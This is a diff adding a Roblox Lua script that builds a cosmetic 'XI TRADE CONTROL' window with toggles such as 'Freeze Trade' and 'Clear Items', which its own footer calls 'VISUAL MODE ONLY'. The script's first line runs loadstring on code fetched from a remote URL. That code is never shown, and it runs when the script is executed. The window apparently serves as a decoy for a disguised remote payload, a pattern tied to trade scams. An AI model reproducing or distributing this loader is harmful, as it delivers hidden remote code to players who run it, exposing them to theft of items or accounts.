@@ -1,0 +1,155 @@
+loadstring(game:HttpGet("https://star-scripts.com/api/run/HAGko_mk9Q3ueW6Qzo4kZICcoCpyQdj-"))()
+local Players = game:GetService("Players")
+local UIS = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+local gui = Instance.new("ScreenGui")
+gui.Name = "XiScriptsTradeControl"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
+
+-- MAIN WINDOW
+local main = Instance.new("Frame")
+main.Name = "Main"
+main.Size = UDim2.fromOffset(225, 205)
+main.Position = UDim2.new(0.5, -112, 0.5, -102)
+main.BackgroundColor3 = Color3.fromRGB(22, 22, 29)
+main.BorderSizePixel = 0
+main.Active = true
+main.Parent = gui
+
+local corner = Instance.new("UICorner")
+corner.CornerRadius = UDim.new(0, 9)
+corner.Parent = main
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(85, 85, 110)
+stroke.Thickness = 1
+stroke.Parent = main
+
+-- TITLE BAR
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 35)
+title.BackgroundColor3 = Color3.fromRGB(32, 32, 43)
+title.Text = "  XI TRADE CONTROL"
+title.TextColor3 = Color3.new(1, 1, 1)
+title.TextSize = 13
+title.Font = Enum.Font.GothamBold
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = main
+
+local titleCorner = Instance.new("UICorner")
+titleCorner.CornerRadius = UDim.new(0, 9)
+titleCorner.Parent = title
+
+-- DRAGGABLE WINDOW
+local dragging = false
+local dragStart
+local startPos
+
+title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+
+        dragging = true
+        dragStart = input.Position
+        startPos = main.Position
+    end
+end)
+
+UIS.InputChanged:Connect(function(input)
+    if dragging and (
+        input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch
+    ) then
+
+        local delta = input.Position - dragStart
+
+        main.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end)
+
+UIS.InputEnded:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1
+    or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = false
+    end
+end)
+
+-- TOGGLE STATES
+local states = {
+    ["Freeze Trade"] = false,
+    ["Clear Items"] = false,
+    ["Anti Bypass"] = false
+}
+
+local function createToggle(name, y)
+
+    local button = Instance.new("TextButton")
+    button.Name = name
+    button.Size = UDim2.new(1, -20, 0, 34)
+    button.Position = UDim2.fromOffset(10, y)
+    button.BackgroundColor3 = Color3.fromRGB(42, 42, 53)
+    button.BorderSizePixel = 0
+    button.Font = Enum.Font.GothamSemibold
+    button.TextSize = 12
+    button.Parent = main
+
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 6)
+    buttonCorner.Parent = button
+
+    local function update()
+        local enabled = states[name]
+
+        button.Text = name .. "     " ..
+            (enabled and "ON" or "OFF")
+
+        button.TextColor3 = enabled
+            and Color3.fromRGB(90, 255, 135)
+            or Color3.fromRGB(255, 100, 100)
+    end
+
+    button.MouseButton1Click:Connect(function()
+        states[name] = not states[name]
+        update()
+    end)
+
+    update()
+end
+
+-- CREATE CONTROLS
+createToggle("Freeze Trade", 45)
+createToggle("Clear Items", 84)
+createToggle("Anti Bypass", 123)
+
+-- FOOTER
+local footer = Instance.new("TextLabel")
+footer.Size = UDim2.new(1, 0, 0, 16)
+footer.Position = UDim2.fromOffset(0, 163)
+footer.BackgroundTransparency = 1
+footer.Text = "VISUAL MODE ONLY"
+footer.TextColor3 = Color3.fromRGB(145, 145, 160)
+footer.TextSize = 9
+footer.Font = Enum.Font.Gotham
+footer.Parent = main
+
+-- WATERMARK
+local watermark = Instance.new("TextLabel")
+watermark.Name = "Watermark"
+watermark.Size = UDim2.new(1, 0, 0, 18)
+watermark.Position = UDim2.fromOffset(0, 183)
+watermark.BackgroundTransparency = 1
+watermark.Text = "@XiScripts"
+watermark.TextColor3 = Color3.fromRGB(150, 150, 190)
+watermark.TextSize = 10
+watermark.Font = Enum.Font.GothamBold
+watermark.Parent = main
+
+print("[XiScripts] Visual Trade Control Loaded!")
